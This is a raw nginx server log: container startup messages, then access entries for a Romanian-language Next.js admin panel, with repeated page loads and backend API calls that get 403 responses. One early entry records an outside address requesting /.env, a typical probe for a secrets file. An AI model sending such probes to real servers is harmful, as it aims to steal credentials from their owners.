/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
10-listen-on-ipv6-by-default.sh: info: /etc/nginx/conf.d/default.conf is not a file or does not exist
/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
/docker-entrypoint.sh: Configuration complete; ready for start up
196.251.85.74 - - [01/Jun/2025:23:40:48 +0000] "GET /.env HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:41:53 +0000] "DELETE /backend-api/users/205 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:41:53 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /_next/image?url=%2Ficons%2FSearchIcon.png&w=32&q=75 HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:55 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /favicon.ico HTTP/1.1" 200 25967 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:41:56 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:41:56 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /favicon.ico HTTP/1.1" 200 25967 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:42:05 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:05 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /favicon.ico HTTP/1.1" 200 25975 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:14 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:42:14 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:42:15 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:15 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /favicon.ico HTTP/1.1" 200 25975 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:26 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:27 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:27 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:27 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:42:27 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:42:27 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:27 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:42:36 +0000] "POST /acasa/administrare/echipamente HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/echipamente" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:42:36 +0000] "GET /backend-api/equipment HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:42:36 +0000] "POST /acasa/administrare/echipamente HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/echipamente" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:42:56 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:42:56 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /icons/mobilenav1.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /icons/buton-logout.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /icons/buton-user-name.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /_next/image?url=%2Ficons%2FSearchIcon.png&w=32&q=75 HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /IsmaBlack.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /home?_rsc=33dh4 HTTP/1.1" 307 16 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /icons/slash-icon.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /acasa?_rsc=33dh4 HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /favicon.ico HTTP/1.1" 200 25975 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
172.27.0.1 - - [01/Jun/2025:23:43:11 +0000] "GET /backend-api/users?size=1000 HTTP/1.1" 403 0 "-" "axios/1.8.4"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /icons/icon-administrare.svg HTTP/1.1" 304 0 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 156 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /acasa/administrare?_rsc=33dh4 HTTP/1.1" 200 1413 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /acasa/administrare/echipamente?_rsc=33dh4 HTTP/1.1" 200 1508 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:11 +0000] "GET /acasa HTTP/1.1" 200 1446 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:12 +0000] "POST /acasa/administrare/utilizatori HTTP/1.1" 200 278 "https://ismauaic.com/acasa/administrare/utilizatori" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
81.18.84.30 - - [01/Jun/2025:23:43:15 +0000] "GET /acasa/administrare/utilizatori HTTP/1.1" 200 3066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
